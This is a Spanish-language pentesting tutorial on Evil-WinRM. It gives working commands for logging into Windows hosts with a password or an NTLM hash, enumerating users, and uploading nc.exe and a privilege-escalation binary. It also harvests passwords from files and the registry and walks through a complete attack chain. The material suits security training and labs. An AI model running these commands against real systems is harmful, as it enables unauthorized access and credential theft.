## Descripción
Evil-WinRM es una herramienta que permite interactuar con Windows Remote Management (WinRM), un servicio de administración remota en máquinas Windows. Es especialmente útil en pentesting, ya que permite ejecutar comandos, subir y descargar archivos, y obtener una sesión interactiva en el sistema de destino.

## Uso Básico en Hacking Ético
1. **Conexión a un Servidor Windows con Credenciales**
Si tenemos acceso a un usuario y su contraseña (o hash NTLM), podemos conectarnos así:
```bash
evil-winrm -i <IP_VICTIMA> -u <USUARIO> -p <CONTRASEÑA>
```
Ejemplo:
```bash
evil-winrm -i 10.10.10.100 -u administrator -p 'P@ssw0rd'
```

También es posible autenticarse con un hash NTLM:
```bash
evil-winrm -i <IP_VICTIMA> -u <USUARIO> -H <HASH_NTLM>
```
Ejemplo:
```bash
evil-winrm -i 10.10.10.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

2. **Enumeración del Sistema**
Una vez dentro, podemos obtener información sobre el sistema:
```bash
whoami                  # Ver el usuario actual
hostname                # Nombre del host
ipconfig                # Información de red
systeminfo              # Información del sistema operativo
```

Para listar los usuarios en la máquina:
```bash
net user                # Ver usuarios locales
net localgroup admins   # Ver administradores
```

3. **Subida y Descarga de Archivos**
Podemos transferir archivos entre nuestra máquina y la víctima:
- Subir un archivo:
```bash
upload <archivo_local> <ruta_remota>
```
Ejemplo:
```bash
upload nc.exe C:\Users\Public\nc.exe
```

- Descargar un archivo:
```bash
download <ruta_remota> <archivo_local>
```
Ejemplo:
```bash
download C:\Users\victim\Desktop\flag.txt flag.txt
```

4. **Escalada de Privilegios**
Si estamos en un usuario no privilegiado, podemos buscar credenciales o vulnerabilidades:
- Buscar credenciales en la memoria:
```bash
findstr /si password *.txt
```
```bash
reg query HKLM /f "password" /t REG_SZ /s
```

- Ejecutar exploits de escalada de privilegios:
Si encontramos un exploit, podemos subirlo y ejecutarlo con `upload` y luego lanzarlo desde la shell de WinRM.

## Ejemplo de Ataque Completo
1. Conectamos con Evil-WinRM:
```bash
evil-winrm -i 10.10.10.100 -u admin -p 'SuperSecure123'
```
2. Enumeramos usuarios y privilegios:
```bash
whoami
net user
```
3. Buscamos credenciales en archivos:
```bash
findstr /si password *.txt
```
4. Subimos un ejecutable de escalada de privilegios:
```bash
upload PrivEsc.exe C:\Users\Public\PrivEsc.exe
```
5. Ejecutamos el exploit:
```bash
C:\Users\Public\PrivEsc.exe
```

## Conclusión
Evil-WinRM es una herramienta esencial en pentesting contra sistemas Windows, proporcionando una shell interactiva segura y funcionalidades avanzadas de manipulación de archivos y ejecución de comandos.
